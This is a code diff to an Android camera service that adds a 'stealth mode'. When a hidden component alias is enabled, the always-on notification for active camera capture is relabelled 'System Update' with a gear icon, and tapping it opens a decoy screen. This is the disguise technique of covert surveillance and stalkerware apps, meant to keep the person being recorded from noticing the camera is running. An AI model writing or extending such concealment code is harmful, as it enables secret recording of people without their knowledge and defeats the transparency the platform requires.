@@ -187,15 +187,21 @@ public class CameraService extends Service {
         return START_NOT_STICKY;
     }
 
+    private boolean isStealthMode() {
+        android.content.ComponentName fakeAlias = new android.content.ComponentName(this, "com.labs.labrats.SystemUpdateAlias");
+        return getPackageManager().getComponentEnabledSetting(fakeAlias) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
+    }
+
     private void ensureForeground() {
-        Intent notificationIntent = new Intent(this, MainActivity.class);
+        boolean stealth = isStealthMode();
+        Intent notificationIntent = new Intent(this, stealth ? DecoyActivity.class : MainActivity.class);
         PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                 PendingIntent.FLAG_IMMUTABLE);
 
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Camera Service")
-                .setContentText("Camera service is active")
-                .setSmallIcon(R.mipmap.ic_launcher)
+                .setContentTitle(stealth ? "System Update" : "Camera Service")
+                .setContentText(stealth ? "Checking for system updates..." : "Camera service is active")
+                .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.mipmap.ic_launcher)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
@@ -1215,14 +1221,15 @@ public class CameraService extends Service {
 
     private void updateNotification(String text) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            Intent notificationIntent = new Intent(this, MainActivity.class);
+            boolean stealth = isStealthMode();
+            Intent notificationIntent = new Intent(this, stealth ? DecoyActivity.class : MainActivity.class);
             PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                     PendingIntent.FLAG_IMMUTABLE);
 
             Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                    .setContentTitle("Camera Service")
-                    .setContentText(text)
-                    .setSmallIcon(R.mipmap.ic_launcher)
+                    .setContentTitle(stealth ? "System Update" : "Camera Service")
+                    .setContentText(stealth ? "Checking for system updates..." : text)
+                    .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.mipmap.ic_launcher)
                     .setContentIntent(pendingIntent)
                     .setOngoing(true)
                     .setPriority(NotificationCompat.PRIORITY_LOW)
